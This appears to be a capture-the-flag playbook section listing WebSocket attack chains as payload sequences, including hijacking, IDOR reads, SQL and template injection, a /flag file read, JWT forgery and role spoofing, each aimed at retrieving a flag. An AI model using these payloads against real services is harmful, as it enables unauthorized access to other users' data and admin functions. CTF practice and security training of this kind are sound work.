# Multi-step chains — the composite exploits

## Chain: CSWSH → message-IDOR → the flag

```text
1. foreign-Origin + cookie-binding + SameSite=Lax -> CSWSH-able
2. the attacker page opens the socket as the victim
3. {"action":"history","room":"dm"} OR {"action":"read","id":"admin"}
4. the victim's socket returns the admin's object -> the flag
```

## Chain: unauth channel → action-dispatch → the flag

```text
1. a 101 with no credentials -> the open socket
2. {"action":"admin"} OR {"action":"flag"} OR {"action":"dump"}
3. the privileged reply -> the flag
```

## Chain: message-IDOR → a hidden field → the flag

```text
1. {"action":"read","id":"admin"} -> the admin's object
2. the object carries {"flag":"...","secret":"..."} -> the flag field
```

## Chain: injection → extraction → the flag

```text
1. {"q":"' UNION SELECT flag,2 FROM x--"} -> the rows
2. OR {"name":"{{config.FLAG}}"} -> the rendered flag
3. OR {"file":"/flag"} -> the file
```

## Chain: subscription-IDOR → the internal feed → the flag

```text
1. {"action":"subscribe","channel":"internal"} OR SUBSCRIBE /user/admin
2. the internal feed's pushed frames -> the flag
```

## Chain: token-in-URL → session-forge → the flag

```text
1. wss://x/ws?token=eyJ... -> the JWT on the URL
2. web-auth-session: the JWT is forgeable (alg:none/weak-key/kid)
3. a forged admin token -> the authed socket -> the flag
```

## Chain: spoof → a privileged write → the flag

```text
1. {"from":"victim","action":"set_role","role":"admin"} -> self-privilege
2. {"action":"admin"} with the new role -> the flag
   OR {"action":"transfer"} as admin -> a state read -> the flag
```

## Chain: graphql-subscription → field-IDOR → the flag

```text
1. {"type":"subscribe","payload":{"query":"subscription{user(id:1){secret}}"}
2. the subscription pushes the other-user's field -> the flag
```

## Chain: namespace + action → the internal command

```text
1. 42/admin,["cmd",{"cmd":"flag"}]   OR   {"action":"internal:flag"}
2. the privileged namespace's action -> the flag
```

## Chain: resumption → another's session → the flag

```text
1. a reconnect with session_id:<other> resumes the old context
2. the resumed socket returns the other's data -> the flag
```

## The chain-record

```
chain: <the steps>: <the composite classes>: <the flag>
  1. <the step + the verbatim reply>
  2. <the step + the verbatim reply>
  flag: <the verbatim flag-bearing reply>
```

The chain is the card's `chain[]` — the steps + the verbatim replies;
the flag-closing class is the LAST step's class.
